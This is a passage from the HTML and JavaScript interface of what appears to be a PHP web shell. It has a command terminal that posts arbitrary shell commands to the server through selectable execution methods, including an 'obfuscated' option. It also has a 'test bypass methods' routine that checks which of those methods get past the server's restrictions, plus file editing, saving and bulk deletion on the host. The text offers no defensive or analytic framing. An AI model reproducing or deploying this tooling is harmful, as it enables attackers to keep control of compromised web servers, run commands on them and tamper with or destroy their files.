                <option value="call_user_func_execution">🔧 call_user_func</option>
                <option value="reflection_execution">🔧 reflection</option>
                <option value="include_execution">🔧 include</option>
                <option value="obfuscated_shell_exec">🔧 obfuscated</option>
            </select>
            <input type="text" id="commandInput" placeholder="Enter command..." autocomplete="off">
            <button type="submit" class="btn btn-primary">▶️</button>
        </form>
    </div>

    <!-- File Editor Modal -->
    <div id="fileModal" class="modal">
        <div class="modal-content">
            <h3 id="modalTitle">📝 File Editor</h3>
            <div id="modalBody">
                <textarea id="fileEditor" class="file-editor"></textarea>
                <div style="margin-top: 10px;">
                    <button class="btn btn-primary" onclick="saveFile()">💾 Save</button>
                    <button class="btn" onclick="closeModal()">Cancel</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentFile = '';
        let isEditing = false;
        let isDragging = false;
        let isFullscreen = false;
        let originalTerminalStyle = {};
        let dragOffset = { x: 0, y: 0 };

        function toggleTerminal() {
            const terminal = document.getElementById('terminal');
            if (terminal.style.display === 'flex') {
                terminal.style.display = 'none';
                if (isFullscreen) {
                    toggleFullscreen();
                }
            } else {
                terminal.style.display = 'flex';
                document.getElementById('commandInput').focus();
            }
        }

        function clearTerminal() {
            const output = document.getElementById('terminalOutput');
            output.innerHTML = `
                <div class="command-output">
                    <div class="command-line">Terminal cleared</div>
                    <div class="output-text">Ready for new commands...</div>
                </div>
            `;
        }

        function testBypassMethods() {
            const output = document.getElementById('terminalOutput');
            
            const testingDiv = document.createElement('div');
            testingDiv.className = 'command-output';
            testingDiv.innerHTML = `
                <div class="command-line">🧪 Testing all bypass methods...</div>
                <div class="output-text">Please wait, this may take a few seconds...</div>
            `;
            output.appendChild(testingDiv);
            output.scrollTop = output.scrollHeight;

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'ajax=test_bypass_methods'
            })
            .then(response => {
                if (!response.ok) throw new Error('HTTP ' + response.status);
                return response.text();
            })
            .then(text => {
                try {
                    return JSON.parse(text);
                } catch (e) {
                    console.error('Invalid JSON response:', text);
                    throw new Error('Invalid JSON response from server');
                }
            })
            .then(data => {
                if (data.error) {
                    testingDiv.querySelector('.output-text').textContent = 'Error: ' + data.message;
                    return;
                }

                let resultText = `\n📊 BYPASS METHODS TEST RESULTS\n`;
                resultText += `═══════════════════════════════════\n`;
                resultText += `✅ Working Methods (${data.working_count}/${data.total_tested}):\n`;

                if (data.working && data.working.length > 0) {
                    data.working.forEach((method, index) => {
                        resultText += `  ${index + 1}. ${method}\n`;
                    });
                } else {
                    resultText += `  ❌ No working methods found!\n`;
                }

                resultText += `\n❌ Failed Methods (${data.failed ? data.failed.length : 0}):\n`;
                if (data.failed && data.failed.length > 0) {
                    data.failed.forEach((method, index) => {
                        resultText += `  ${index + 1}. ${method}\n`;
                    });
                } else {
                    resultText += `  ✅ All methods working!\n`;
                }

                resultText += `\n🔧 Test Command: ${data.test_command || 'N/A'}\n`;
                resultText += `🖥️ PHP Version: ${data.php_version || 'Unknown'}\n`;
                resultText += `💻 OS: ${data.os || 'Unknown'}\n`;
                resultText += `═══════════════════════════════════`;

                testingDiv.querySelector('.output-text').textContent = resultText;
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                console.error('Test error:', error);
                testingDiv.querySelector('.output-text').textContent = 'Error testing methods: ' + error.message;
            });
        }

        function executeCommand(event) {
            event.preventDefault();
            const command = document.getElementById('commandInput').value;
            const method = document.getElementById('methodSelect').value;

            if (!command.trim()) return;

            if (command.toLowerCase() === 'clear') {
                clearTerminal();
                document.getElementById('commandInput').value = '';
                return;
            }

            const output = document.getElementById('terminalOutput');
            const commandDiv = document.createElement('div');
            commandDiv.className = 'command-output';
            commandDiv.innerHTML = `
                <div class="command-line">$ ${command} [Method: ${method}]</div>
                <div class="output-text">Executing...</div>
            `;
            output.appendChild(commandDiv);
            output.scrollTop = output.scrollHeight;

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `ajax=execute_command&command=${encodeURIComponent(command)}&method=${method}`
            })
            .then(response => response.json())
            .then(data => {
                commandDiv.querySelector('.output-text').textContent = data.output;
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                commandDiv.querySelector('.output-text').textContent = 'Error: ' + error.message;
            });

            document.getElementById('commandInput').value = '';
        }

        function editFile(filePath) {
            currentFile = filePath;
            document.getElementById('modalTitle').textContent = '📝 Editing: ' + filePath;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `ajax=get_file_content&file=${encodeURIComponent(filePath)}`
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('fileEditor').value = data.content || '';
                document.getElementById('fileModal').style.display = 'block';
            })
            .catch(error => {
                alert('Error loading file: ' + error.message);
            });
        }

        function saveFile() {
            const content = document.getElementById('fileEditor').value;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `ajax=save_file&file=${encodeURIComponent(currentFile)}&content=${encodeURIComponent(content)}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('File saved successfully!');
                    closeModal();
                } else {
                    alert('Error saving file!');
                }
            })
            .catch(error => {
                alert('Error saving file: ' + error.message);
            });
        }

        function closeModal() {
            document.getElementById('fileModal').style.display = 'none';
            currentFile = '';
        }

        function deleteItem(itemPath) {
            if (confirm('Are you sure you want to delete: ' + itemPath + '?')) {
                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `ajax=bulk_delete&files=${encodeURIComponent(JSON.stringify([itemPath]))}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.deleted.length > 0) {
                        alert('Item deleted successfully!');
                        location.reload();
                    } else {
                        alert('Error deleting item!');
                    }
                })
                .catch(error => {
                    alert('Error deleting item: ' + error.message);
                });
            }
        }

        function toggleFullscreen() {
            const terminal = document.getElementById('terminal');
            
            if (!isFullscreen) {
                originalTerminalStyle = {
                    position: terminal.style.position || 'fixed',
                    top: terminal.style.top || 'auto',
                    left: terminal.style.left || 'auto',
                    right: terminal.style.right || '20px',
                    bottom: terminal.style.bottom || '90px',
                    width: terminal.style.width || '500px',
                    height: terminal.style.height || '400px',
                    maxWidth: terminal.style.maxWidth || '90vw',
                    maxHeight: terminal.style.maxHeight || '80vh'
                };
                
                terminal.style.position = 'fixed';
                terminal.style.top = '10px';
                terminal.style.left = '10px';
                terminal.style.right = '10px';
                terminal.style.bottom = '10px';
                terminal.style.width = 'auto';
                terminal.style.height = 'auto';
                terminal.style.maxWidth = 'none';
                terminal.style.maxHeight = 'none';
                terminal.style.resize = 'none';
                
                isFullscreen = true;
            } else {
                Object.keys(originalTerminalStyle).forEach(key => {
                    terminal.style[key] = originalTerminalStyle[key];
                });
                terminal.style.resize = 'both';
                
                isFullscreen = false;
            }
        }

        function startDrag(event) {
            if (isFullscreen) return;
            
            isDragging = true;
            const terminal = document.getElementById('terminal');
            const rect = terminal.getBoundingClientRect();
            dragOffset.x = event.clientX - rect.left;
            dragOffset.y = event.clientY - rect.top;
            
            document.addEventListener('mousemove', handleDrag);
            document.addEventListener('mouseup', stopDrag);
            event.preventDefault();
        }

        function handleDrag(event) {
            if (!isDragging || isFullscreen) return;
            
            const terminal = document.getElementById('terminal');
            const x = event.clientX - dragOffset.x;
            const y = event.clientY - dragOffset.y;
            
            const maxX = window.innerWidth - terminal.offsetWidth;
            const maxY = window.innerHeight - terminal.offsetHeight;
            
            terminal.style.left = Math.max(0, Math.min(x, maxX)) + 'px';
            terminal.style.top = Math.max(0, Math.min(y, maxY)) + 'px';
            terminal.style.right = 'auto';
            terminal.style.bottom = 'auto';
        }

        function stopDrag() {
            isDragging = false;
            document.removeEventListener('mousemove', handleDrag);
            document.removeEventListener('mouseup', stopDrag);
        }

        // File selection functions
        function selectAllFiles() {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(checkbox => {
                checkbox.checked = true;
            });
            updateSelectedCount();
        }

        function deselectAllFiles() {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(checkbox => {
                checkbox.checked = false;
            });
            updateSelectedCount();
        }

        function updateSelectedCount() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const count = checkboxes.length;
            const countSpan = document.getElementById('selectedCount');
            const deleteBtn = document.getElementById('deleteSelectedBtn');
            
            countSpan.textContent = count;
            deleteBtn.disabled = count === 0;
            
            if (count === 0) {
                deleteBtn.style.opacity = '0.5';
            } else {
                deleteBtn.style.opacity = '1';
            }
        }

        function deleteSelectedFiles() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const selectedFiles = Array.from(checkboxes).map(cb => cb.value);
            
            if (selectedFiles.length === 0) {
                alert('No files selected!');
                return;
            }
            
            const fileList = selectedFiles.map(file => file.split(/[\\/]/).pop()).join('\n');
            
            if (confirm(`Are you sure you want to delete ${selectedFiles.length} selected item(s)?\n\nFiles to delete:\n${fileList}`)) {
                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `ajax=bulk_delete&files=${encodeURIComponent(JSON.stringify(selectedFiles))}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.deleted && data.deleted.length > 0) {
                        let message = `Successfully deleted ${data.deleted.length} item(s).`;
                        if (data.errors && data.errors.length > 0) {
                            message += `\n\nFailed to delete ${data.errors.length} item(s):\n${data.errors.join('\n')}`;
                        }
                        alert(message);
                        location.reload();
                    } else {
                        alert('No items were deleted. Check permissions.');
                    }
                })
                .catch(error => {
                    alert('Error deleting files: ' + error.message);
                });
            }
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('fileModal');
            if (event.target === modal) {
                closeModal();
            }
        }
    </script>
</body>
</html>
